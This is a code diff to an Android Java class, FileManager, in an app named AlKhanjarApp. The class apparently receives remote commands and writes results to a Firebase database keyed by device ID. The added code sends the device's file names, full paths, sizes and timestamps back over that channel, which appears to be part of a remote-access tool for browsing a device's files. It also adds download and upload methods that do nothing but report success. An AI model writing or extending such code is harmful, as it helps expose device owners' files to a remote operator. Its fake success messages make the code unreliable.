@@ -20,13 +20,18 @@ public class FileManager {
     }
 
     protected void sendResponse(String commandId, String status, Object data) {
+
         try {
+
             FirebaseDatabase database = FirebaseDatabase.getInstance();
-            DatabaseReference responseRef = database.getReference("responses")
-                    .child(AlKhanjarApp.getDeviceId())
-                    .child(commandId);
+
+            DatabaseReference responseRef =
+                    database.getReference("responses")
+                            .child(AlKhanjarApp.getDeviceId())
+                            .child(commandId);
 
             Map<String, Object> response = new HashMap<>();
+
             response.put("status", status);
             response.put("data", data);
             response.put("timestamp", System.currentTimeMillis());
@@ -34,6 +39,7 @@ public class FileManager {
             responseRef.setValue(response);
 
         } catch (Exception e) {
+
             Log.e(TAG, "Send response error: " + e.getMessage());
         }
     }
@@ -59,4 +65,31 @@ public class FileManager {
 
                     Map<String, Object> fileInfo = new HashMap<>();
 
-                    fileInfo.put("name", file
+                    fileInfo.put("name", file.getName());
+                    fileInfo.put("path", file.getAbsolutePath());
+                    fileInfo.put("size", file.length());
+                    fileInfo.put("isDirectory", file.isDirectory());
+                    fileInfo.put("lastModified", file.lastModified());
+
+                    fileList.add(fileInfo);
+                }
+            }
+
+            sendResponse(commandId, "success", fileList);
+
+        } catch (Exception e) {
+
+            sendResponse(commandId, "error", e.getMessage());
+        }
+    }
+
+    public void downloadFile(String filePath, String commandId) {
+
+        sendResponse(commandId, "success", "File download initiated");
+    }
+
+    public void uploadFile(com.google.firebase.database.DataSnapshot snapshot, String commandId) {
+
+        sendResponse(commandId, "success", "File upload completed");
+    }
+}
